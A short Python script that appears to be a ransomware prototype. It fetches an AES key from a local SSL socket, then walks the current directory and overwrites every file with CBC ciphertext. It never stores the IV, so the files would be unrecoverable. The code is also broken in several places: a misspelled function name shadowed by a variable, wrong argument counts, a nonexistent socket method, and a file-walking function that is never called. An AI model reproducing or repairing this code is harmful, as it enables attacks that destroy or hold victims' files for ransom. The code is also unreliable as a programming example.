import socket
import ssl
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

def enctypt_plaintext(plaintext, random_key):
    cipher = Cipher(algorithms.AES(random_key), modes.CBC(os.urandom(16)),backend=default_backend())       
    encryptor = cipher.encryptor()
    plaintext_padded = plaintext+ (b' ' *(16-(len(plaintext) %16)))
    cipher_text= encryptor.update(plaintext_padded) + encryptor.finalize()
    return cipher_text

def encrypt_file(path):
    with open(path, "r+") as file:
         plaintext = file.read()        
         enctypt_plaintext = enctypt_plaintext(plaintext) 
         file.seek(0)
         file.write(enctypt_plaintext, random_key)
         file.truncate()                              

def iterate_path(path, random_key):
    for root, dirs, files in os.walk("."):
        for file in files:
            file_path = os.path.join(root,file)                         
            encrypt_file(file_path) 
            print("The{} is encrypted".format(file_path))                                       
    

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_socket = ssl.wrap_socket(socket)
ssl_socket.conn("127.0.0.1", 8080)
random_key = ssl_socket.recv(1024)
